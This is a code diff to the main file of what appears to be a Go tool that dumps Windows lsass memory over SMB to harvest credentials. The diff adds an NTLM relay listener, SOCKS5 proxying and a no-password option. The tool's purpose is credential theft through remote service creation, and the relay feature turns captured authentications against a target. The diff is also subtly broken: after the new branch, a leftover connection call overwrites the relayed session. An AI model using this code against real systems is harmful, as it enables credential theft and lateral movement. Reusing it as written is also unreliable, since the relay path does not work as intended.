@@ -31,6 +31,7 @@ import (
 
 	rundebug "runtime/debug"
 
+	"golang.org/x/net/proxy"
 	"golang.org/x/term"
 
 	"github.com/jfjallid/go-smb/smb"
@@ -39,7 +40,7 @@ import (
 )
 
 var log = golog.Get("")
-var release string = "0.1.1"
+var release string = "0.2.0"
 var bind *dcerpc.ServiceBind
 var session *smb.Connection
 
@@ -171,10 +172,17 @@ var helpMsg = `
       -d, --domain              Domain name to use for login
       -u, --user                Username
       -p, --pass                Password
+      -n, --no-pass             Disable password prompt and send no credentials
           --hash                Hex encoded NT Hash for user password
           --local               Authenticate as a local user instead of domain user
-      -n, --null                Attempt null session authentication
       -t, --timeout             Dial timeout in seconds (default 5)
+          --relay               Start an SMB listener that will relay incoming
+                                NTLM authentications to the remote server and
+                                use that connection. NOTE that this forces SMB 2.1
+                                without encryption.
+          --relay-port <port>   Listening port for relay (default 445)
+          --socks-host <target> Establish connection via a SOCKS5 proxy server
+          --socks-port <port>   SOCKS5 proxy port (default 1080)
           --cleanup             Perform a cleanup of service binary, service, and dumpfile
           --dumper <path>       Path to local lsass dump utility (default pdumpsvc.exe)
           --service <name>      Name of service that will be created to run the lsass dumper (default MiscSVC)
@@ -191,9 +199,9 @@ var helpMsg = `
 `
 
 func main() {
-	var host, username, password, hash, domain, serviceName, dumper, svcBinaryName, svcBinaryPath, dumpFileName, dumpDir, outFile string
-	var port, dialTimeout int
-	var debug, noEnc, forceSMB2, localUser, nullSession, version, runCleanup, verbose bool
+	var host, username, password, hash, domain, serviceName, dumper, svcBinaryName, svcBinaryPath, dumpFileName, dumpDir, outFile, socksIP string
+	var port, dialTimeout, socksPort, relayPort int
+	var debug, noEnc, forceSMB2, localUser, version, runCleanup, verbose, relay, noPass bool
 	var err error
 	var hashBytes []byte
 
@@ -229,6 +237,12 @@ func main() {
 	flag.StringVar(&dumpFileName, "dumpfile", "misc.log", "")
 	flag.StringVar(&outFile, "output", "lsass.dmp", "")
 	flag.StringVar(&dumpDir, "dumpdir", "C:\\windows\\", "")
+	flag.BoolVar(&relay, "relay", false, "")
+	flag.IntVar(&relayPort, "relay-port", 445, "")
+	flag.StringVar(&socksIP, "socks-host", "", "")
+	flag.IntVar(&socksPort, "socks-port", 1080, "")
+	flag.BoolVar(&noPass, "no-pass", false, "")
+	flag.BoolVar(&noPass, "n", false, "")
 
 	flag.Parse()
 
@@ -236,17 +250,20 @@ func main() {
 		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
 		log.SetLogLevel(golog.LevelDebug)
 	} else if verbose {
-		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelInfo, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
 		log.SetLogLevel(golog.LevelInfo)
 	} else {
-		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
-		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
+		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc/msrrp", "msrrp", golog.LevelNotice, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
 	}
 
 	if version {
@@ -263,6 +280,12 @@ func main() {
 
 	if host == "" {
 		log.Errorln("Must specify a hostname")
+		flag.Usage()
+		return
+	}
+
+	if socksIP != "" && isFlagSet("timeout") {
+		log.Errorln("When a socks proxy is specified, --timeout is not supported")
 		flag.Usage()
 		return
 	}
@@ -333,43 +356,67 @@ func main() {
 		}
 	}
 
-	if (password == "") && (hashBytes == nil) {
-		if (username != "") && (!nullSession) {
-			// Check if password is already specified to be empty
-			if !isFlagSet("P") && !isFlagSet("pass") {
-				fmt.Printf("Enter password: ")
-				passBytes, err := term.ReadPassword(int(os.Stdin.Fd()))
-				fmt.Println()
-				if err != nil {
-					log.Errorln(err)
-					return
-				}
-				password = string(passBytes)
+	if noPass {
+		password = ""
+		hashBytes = nil
+	} else {
+		if (password == "") && (hashBytes == nil) {
+			fmt.Printf("Enter password: ")
+			passBytes, err := term.ReadPassword(int(os.Stdin.Fd()))
+			fmt.Println()
+			if err != nil {
+				log.Errorln(err)
+				return
 			}
+			password = string(passBytes)
 		}
 	}
 
-	timeout, err := time.ParseDuration(fmt.Sprintf("%ds", dialTimeout))
-	if err != nil {
-		log.Errorln(err)
-		return
-	}
 	options := smb.Options{
 		Host: host,
 		Port: port,
 		Initiator: &smb.NTLMInitiator{
-			User:               username,
-			Password:           password,
-			Hash:               hashBytes,
-			Domain:             domain,
-			LocalUser:          localUser,
-			NullSession:        nullSession,
-			EncryptionDisabled: noEnc,
+			User:      username,
+			Password:  password,
+			Hash:      hashBytes,
+			Domain:    domain,
+			LocalUser: localUser,
 		},
 		DisableEncryption: noEnc,
 		ForceSMB2:         forceSMB2,
-		DialTimeout:       timeout,
 	}
+
+	// Only if not using SOCKS
+	if socksIP == "" {
+		options.DialTimeout, err = time.ParseDuration(fmt.Sprintf("%ds", dialTimeout))
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
+	}
+
+	var session *smb.Connection
+
+	if socksIP != "" {
+		dialSocksProxy, err := proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", socksIP, socksPort), nil, proxy.Direct)
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
+		options.ProxyDialer = dialSocksProxy
+	}
+
+	if relay {
+		options.RelayPort = relayPort
+		session, err = smb.NewRelayConnection(options)
+	} else {
+		session, err = smb.NewConnection(options)
+	}
+	if err != nil {
+		log.Criticalln(err)
+		return
+	}
+
 	session, err = smb.NewConnection(options)
 	if err != nil {
 		log.Criticalln(err)
@@ -384,9 +431,10 @@ func main() {
 	}
 
 	if session.IsAuthenticated {
-		log.Noticeln("[+] Login successful")
+		log.Noticef("[+] Login successful as %s\n", session.GetAuthUsername())
 	} else {
 		log.Noticeln("[-] Login failed")
+		return
 	}
 
 	if runCleanup {
